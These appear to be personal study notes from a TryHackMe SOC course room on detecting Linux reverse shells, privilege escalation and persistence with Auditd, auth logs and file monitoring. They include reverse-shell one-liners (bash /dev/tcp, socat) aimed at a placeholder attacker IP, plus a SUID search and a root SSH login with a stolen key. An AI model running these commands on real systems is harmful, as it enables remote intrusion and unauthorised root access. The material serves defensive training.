# Room: Linux Threat Detection 3

**Platform:** TryHackMe

**Path:** SOC Level 1

**Status:** Completed

---

# Objective

Learn how attackers establish reverse shells, escalate privileges, maintain persistence on Linux systems, and how SOC analysts detect these activities using Auditd, authentication logs, file monitoring, and process tree analysis.

---

# Topics Covered

- Reverse Shells
- Privilege Escalation
- Persistence
- Cron Jobs
- Systemd Services
- Account Persistence
- SSH Key Persistence
- Auditd
- Threat Hunting

---

# Key Concepts

## Reverse Shells

A reverse shell allows a compromised Linux machine to initiate a connection back to the attacker's system, providing remote command execution.

Common methods include:

### Bash Reverse Shell

```bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```

### Socat Reverse Shell

```bash
socat TCP:<ATTACKER-IP>:<PORT> EXEC:'bash',pty,stderr,setsid,sigint,sane
```

### Python Reverse Shell

```bash
python3 -c '...'
```

Reverse shells are commonly used after exploitation to obtain interactive access to the victim.

---

## Detecting Reverse Shells

SOC analysts should investigate:

- Unexpected outbound connections.
- Bash or Python spawning network connections.
- Suspicious parent-child process relationships.
- Unknown external IP addresses.
- Unusual ports such as 4444 or other non-standard ports.

Useful log sources include:

- Auditd
- Network traffic
- EDR telemetry

---

## Privilege Escalation

After gaining initial access, attackers often attempt to obtain root privileges.

Common techniques include:

- Exploiting vulnerable software.
- Abusing SUID binaries.
- Stolen SSH keys.
- Misconfigured permissions.

Examples:

```bash
find /bin -perm -4000
```

Searches for SUID binaries.

```bash
ssh root@localhost -i ssh-backup-key
```

Uses stolen SSH private keys.

Privilege escalation typically follows a Discovery phase where attackers identify potential weaknesses.

---

## Detecting Privilege Escalation

Instead of detecting every exploit individually, analysts should monitor surrounding attacker activity.

Indicators include:

- Discovery commands.
- Unexpected downloads.
- Exploit execution.
- Sudden privilege changes.
- Root shell creation.
- Sensitive file access.

Building a process tree greatly improves investigation accuracy.

---

## Linux Persistence

Persistence enables attackers to maintain long-term access after system reboot or credential changes.

Common Linux persistence methods include:

- Cron Jobs
- Systemd Services
- New User Accounts
- Backdoored SSH Keys

---

## Cron Job Persistence

Cron jobs are one of the most common Linux persistence techniques.

Attackers may schedule malware execution using:

```bash
crontab -e
```

or directly modify:

```text
/etc/crontab
/etc/cron.d/
/var/spool/cron/
```

Malware may also use:

```text
@reboot
```

to execute immediately after system startup.

---

## Systemd Persistence

Attackers with root privileges may create malicious services that automatically start during boot.

Common directories include:

```text
/etc/systemd/system/
/lib/systemd/system/
```

Example:

```text
cloud-online.service
```

Malicious services often disguise themselves as legitimate system services.

---

## Detecting Persistence

Useful detection methods include:

### Monitor Cron Files

Monitor changes to:

```text
/etc/crontab
/etc/cron.d/*
/var/spool/cron/*
```

---

### Monitor Systemd Services

Watch for file creation or modification inside:

```text
/etc/systemd/system/
/lib/systemd/system/
```

---

### Monitor Related Processes

Examples:

```bash
crontab
systemctl
nano /etc/crontab
```

Unexpected execution of these commands may indicate persistence attempts.

---

## Detecting with Auditd

Useful Auditd commands include:

```bash
ausearch -i -f /etc/systemd
```

Monitor changes to Systemd configuration files.

```bash
ausearch -i -x crontab
```

Identify execution of the `crontab` command.

Auditd provides detailed visibility into persistence-related activity.

---

## Account Persistence

Instead of deploying malware, attackers may maintain access by creating privileged accounts.

Indicators include:

- New user creation.
- Group membership changes.
- Addition to the `sudo` group.

Authentication logs can reveal:

```bash
useradd
usermod
```

events inside:

```text
/var/log/auth.log
```

---

## SSH Key Persistence

Attackers frequently modify:

```text
~/.ssh/authorized_keys
```

to add their own public keys.

This allows future SSH access without knowing the user's password.

Since shell built-in commands such as `echo` may bypass process monitoring, file monitoring is the preferred detection method.

---

## Linux in Enterprise Environments

Linux servers often host critical infrastructure including:

- Web Servers
- Firewalls
- Mail Servers
- DNS Servers
- Application Servers

A compromise of a single Linux server may provide attackers with access to an entire enterprise environment.

---

# Key Takeaways

- Reverse shells provide interactive remote access after exploitation.
- Privilege escalation usually follows Discovery.
- Auditd is one of the most valuable Linux detection sources.
- Cron jobs and Systemd services are common persistence mechanisms.
- Authentication logs help detect malicious account creation.
- Monitoring `authorized_keys` helps identify SSH persistence.
- Process tree analysis remains essential throughout every investigation.

---

# SOC Perspective

Linux investigations rarely end after detecting Initial Access. SOC analysts must continue tracking attacker activity through privilege escalation, reverse shell establishment, persistence mechanisms, and long-term access techniques. By correlating Auditd events, authentication logs, file modifications, and process trees, analysts can reconstruct the full attack lifecycle and identify how attackers maintain control over compromised Linux systems.
